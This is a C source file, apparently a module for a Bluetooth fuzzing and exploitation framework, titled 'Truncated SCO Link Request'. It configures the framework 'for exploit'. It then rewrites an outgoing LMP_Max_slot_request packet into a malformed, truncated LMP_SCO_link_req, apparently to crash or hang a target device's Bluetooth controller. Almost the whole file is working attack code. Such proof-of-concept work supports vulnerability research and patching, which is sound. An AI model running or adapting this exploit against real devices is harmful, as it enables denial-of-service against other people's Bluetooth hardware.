#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>

// Filters

// Vars

// Setup
static const char *module_name()
{
    return "Truncated SCO Link Request";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 1500;
    config->bluetooth.disable_role_switch = true;
    config->bluetooth.randomize_own_bt_address = false;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static uint flag = 0;

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Wait for LMP_Max_slot_request
    if (pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 46))
    {
        // Change to LMP_SCO_link_req with ACL length = 2
        pkt_buf[4] = (43 << 1) | 1;
        return 1;
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}